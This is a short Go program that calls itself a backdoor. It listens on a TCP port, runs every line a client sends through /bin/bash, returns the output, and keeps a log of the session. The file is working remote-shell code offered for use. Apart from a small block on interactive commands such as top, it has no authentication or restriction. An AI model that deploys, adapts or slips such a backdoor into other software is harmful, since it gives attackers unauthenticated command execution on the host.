package main

import (
	"os"
	"io"
	"net"
	"log"
	"time"
	"bufio"
	"strings"
	"os/exec"
)

var logging_file *os.File

func define_logging() {
	log.SetFlags(log.Lmsgprefix)
	log.SetPrefix("[" + time.Now().Format(time.RFC3339) + "] ")
	logging_file, err := os.OpenFile("log_backdoor.txt", os.O_CREATE | os.O_APPEND | os.O_RDWR, 0666)
	if err != nil {
		panic(err)
	}
	log.SetOutput(io.MultiWriter(os.Stdout, logging_file))
}

func check_command(args_command []string) (bool, string) {
	msg_done := "Command ok!!"
	msg_error := "Command error!!"
	msg_block := "Command blocked!!"
	if (len(args_command) < 1){
		return true, msg_done
	}
	if (args_command[0] == "cd" && len(args_command) < 2) {
		return false, msg_error
	}
	if (args_command[0] == "top") {
		return false, msg_block
	}
	if (args_command[0] == "htop") {
		return false, msg_block
	}
	if (args_command[0] == "watch") {
		return false, msg_block
	}
	return true, msg_done
}

func handle_connection(connection net.Conn) {
	client_address := connection.RemoteAddr().String()
	log.Println("Connection from", client_address)

	curr_path, _ := os.Getwd()
	connection.Write([]byte("\n" + curr_path + "> "))

	for {
		command_data, err := bufio.NewReader(connection).ReadString('\n')
		if err != nil {
			log.Println(err)
			defer connection.Close()
			return
		}

		command_data = strings.TrimSpace(string(command_data))

		if (command_data == "exit" || command_data == "logout" || command_data == "quit") {
			log.Println("Stop connection", client_address) 
			defer connection.Close()
			return
		}

		log.Println("[" + client_address + "]", string(command_data))

		args_command := strings.Fields(command_data)

		check_cmd, msg_cmd := check_command(args_command)

		if (! check_cmd) {
			connection.Write([]byte(msg_cmd))
		} else {
			if (len(args_command) > 1 && args_command[0] == "cd" ) {
				os.Chdir(args_command[1])
			} else {
				execute_command := exec.Command("/bin/bash", "-c", command_data)
				std_out := new(strings.Builder)
				execute_command.Stdout = std_out
				execute_command.Run()
				connection.Write([]byte(std_out.String()))
			}
		}

		curr_path, _ = os.Getwd()
		connection.Write([]byte("\n" + curr_path + "> "))
	}
}

func main() {
	args := os.Args
	if len(args) < 2 {
		log.Println("Error: Need a port!!")
		return
	}
	listen_port := args[1]
	define_logging()
	listener, err := net.Listen("tcp", "localhost:" + listen_port)

	if err != nil {
		log.Println("Error listening on TCP port %v: %v\n", listen_port, err)
    } else {
		log.Println("Listening on TCP port " + listen_port + "...")
    }

    for {
        connection, err := listener.Accept()
        if err != nil {
			log.Println("Connection failure: %v\n", err)
        }

    	go handle_connection(connection) 
    }
}